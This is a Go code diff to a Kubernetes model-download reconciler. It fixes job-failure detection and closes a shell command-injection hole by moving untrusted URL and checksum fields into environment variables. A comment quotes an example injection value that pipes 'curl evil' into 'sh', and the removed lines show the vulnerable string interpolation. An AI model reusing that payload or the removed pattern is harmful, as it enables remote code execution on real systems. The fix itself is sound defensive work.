@@ -564,7 +564,18 @@ func (r *ModelReconciler) reconcileDownloading(ctx context.Context, model *sympo
 		return ctrl.Result{RequeueAfter: 5 * time.Second}, nil
 	}
 
-	if job.Status.Failed > 0 {
+	// Only treat the download as failed once the Job itself reaches a terminal
+	// Failed condition (BackoffLimit exhausted). Keying off job.Status.Failed > 0
+	// marked the Model permanently Failed on the first transient pod failure,
+	// even though the Job was still retrying and might yet succeed.
+	jobFailed := false
+	for _, c := range job.Status.Conditions {
+		if c.Type == batchv1.JobFailed && c.Status == corev1.ConditionTrue {
+			jobFailed = true
+			break
+		}
+	}
+	if jobFailed {
 		log.Info("Model download failed")
 		model.Status.Phase = sympoziumv1alpha1.ModelPhaseFailed
 		model.Status.Message = "Download job failed"
@@ -779,39 +790,41 @@ func (r *ModelReconciler) ensureDownloadJob(ctx context.Context, model *sympoziu
 	modelPath := filepath.Join(modelMountPath, filename)
 	tempPath := modelPath + ".tmp"
 
-	// Download with atomic rename: download to .tmp then move.
-	// When a SHA256 checksum is provided, verify after download.
+	// Download with atomic rename: download to .tmp then move. The URL,
+	// checksum, and paths are passed to the container as environment variables
+	// and referenced (quoted) from a *static* script, so untrusted Model CR
+	// fields (source.url, source.sha256, filename) can never be interpolated
+	// into the shell command — closing a command-injection sink where e.g.
+	// `url: '"; curl evil|sh; "'` would previously have executed.
 	checksumScript := ""
 	if model.Spec.Source.SHA256 != "" {
-		checksumScript = fmt.Sprintf(`
+		checksumScript = `
 echo "Verifying SHA-256 checksum..."
-ACTUAL=$(sha256sum "%s" | cut -d ' ' -f1)
-EXPECTED="%s"
-if [ "$ACTUAL" != "$EXPECTED" ]; then
-  echo "Checksum mismatch: expected $EXPECTED, got $ACTUAL"
-  rm -f "%s"
+ACTUAL=$(sha256sum "$MODEL_TMP_PATH" | cut -d ' ' -f1)
+if [ "$ACTUAL" != "$MODEL_SHA256" ]; then
+  echo "Checksum mismatch: expected $MODEL_SHA256, got $ACTUAL"
+  rm -f "$MODEL_TMP_PATH"
   exit 1
 fi
-echo "Checksum verified"`,
-			tempPath, model.Spec.Source.SHA256, tempPath,
-		)
+echo "Checksum verified"`
 	}
 
-	downloadScript := fmt.Sprintf(`set -e
-if [ -f "%s" ]; then
+	downloadScript := `set -e
+if [ -f "$MODEL_PATH" ]; then
   echo "Model file already exists, skipping download"
   exit 0
 fi
-echo "Downloading model from %s"
-curl -L --fail --retry 3 --retry-delay 5 -o "%s" "%s"%s
-mv "%s" "%s"
-echo "Download complete"`,
-		modelPath,
-		model.Spec.Source.URL,
-		tempPath, model.Spec.Source.URL,
-		checksumScript,
-		tempPath, modelPath,
-	)
+echo "Downloading model from $MODEL_URL"
+curl -L --fail --retry 3 --retry-delay 5 -o "$MODEL_TMP_PATH" "$MODEL_URL"` + checksumScript + `
+mv "$MODEL_TMP_PATH" "$MODEL_PATH"
+echo "Download complete"`
+
+	downloadEnv := []corev1.EnvVar{
+		{Name: "MODEL_URL", Value: model.Spec.Source.URL},
+		{Name: "MODEL_SHA256", Value: model.Spec.Source.SHA256},
+		{Name: "MODEL_PATH", Value: modelPath},
+		{Name: "MODEL_TMP_PATH", Value: tempPath},
+	}
 
 	backoffLimit := int32(2)
 	ttlSeconds := int32(300)
@@ -833,6 +846,7 @@ echo "Download complete"`,
 							Name:            "download",
 							Image:           downloadJobImage,
 							Command:         []string{"sh", "-c", downloadScript},
+							Env:             downloadEnv,
 							SecurityContext: modelContainerSecurityContext(),
 							VolumeMounts: []corev1.VolumeMount{
 								{Name: "model-storage", MountPath: modelMountPath},
